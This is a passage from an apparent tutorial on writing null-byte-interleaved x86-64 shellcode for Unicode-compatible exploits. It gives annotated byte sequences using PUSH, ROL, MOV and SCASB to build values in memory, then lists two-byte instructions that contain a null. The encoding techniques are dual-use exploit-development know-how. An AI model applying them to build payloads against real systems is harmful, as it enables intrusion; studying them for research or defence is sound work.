bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 16:21:49 UTC --></p>\n<p>Another way using Rotate Left (ROL).</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x68\\x00\\x78\\x00\\x34\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008000;\">0x34007800</span>        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rsp</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc1\\x00\\x18\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">rol</span>   <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x18</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x35\\x00\\x56\\x00\\x12\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">xor</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x12005600</span>   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 16:01:38 UTC --></p>\n<p>Another example using MOV and ROL.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x68\\x00\\x56\\x00\\x12\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008000;\">0x12005600</span>        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rsp</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc6\\x00\\x78\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x78</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc1\\x00\\x10\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">rol</span>   <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x10</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc6\\x00\\x34\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x34</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc1\\x00\\x10\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">rol</span>   <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x10</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 16:06:06 UTC --></p>\n<p>Final example uses MOV, ADD, SCASB with the address of buffer stored in RDI.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rsp</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x5f\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rdi</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xb8\\x00\\x12\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff001200</span>   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xbb\\x00\\x34\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">ebx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff003400</span>   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xb9\\x00\\x56\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">ecx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff005600</span>   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xba\\x00\\x78\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">edx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff007800</span>   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x27\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rdi</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ah</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xae\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">scasb</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x3f\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rdi</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">bh</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xae\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">scasb</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x2f\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rdi</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ch</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xae\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">scasb</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x37\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rdi</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">dh</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 16:16:07 UTC --></p>\n<h3 id=\"jcc\">3.6 Two Byte Instructions</h3>\n<p>If all you need are two byte instructions that contain one null byte, the following may be considered. For the branch instructions, regardless of whether a condition is true or false, the instruction is always branching to the next address. The loop instructions might be useful if you want to subtract 1 from an address. To add 1 or 4 to an address, copy it to RDI and use SCASB or SCASD. LODSB or LODSD can be used too if the address is in RSI, but just remember they overwrite AL and EAX respectively.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #696969;\">; logic</span>\n    <span style=\"color: #800000; font-weight: bold;\">or</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">xor</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">and</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #696969;\">; arithmetic</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">adc</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">sbb</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">sub</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #696969;\">; comparison predicates</span>\n    <span style=\"color: #800000; font-weight: bold;\">cmp</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">test</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #696969;\">; data transfer</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">ah</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">bl</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">bh</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">cl</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">ch</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">dl</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span> <span style=\"color: #000080;\">dh</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    \n    <span style=\"color: #696969;\">; branches</span>\n    <span style=\"color: #800000; font-weight: bold;\">jmp</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">jo</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jno</span> <span style=\"color: #e34adc;\">$+2</span>\n  \n    <span style=\"color: #800000; font-weight: bold;\">jb</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jae</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">je</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jne</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">jbe</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">ja</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">js</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jns</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">jp</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jnp</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">jl</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jge</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">jle</span> <span style=\"color: #e34adc;\">$+2</span>\n    <span style=\"color: #800000; font-weight: bold;\">jg</span> <span style=\"color: #e34adc;\">$+2</span>\n\n    jrcxz $<span style=\"color: #008c00;\">+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">loop</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">loope</span> <span style=\"color: #e34adc;\">$+2</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">loopne</span> <span style=\"color: 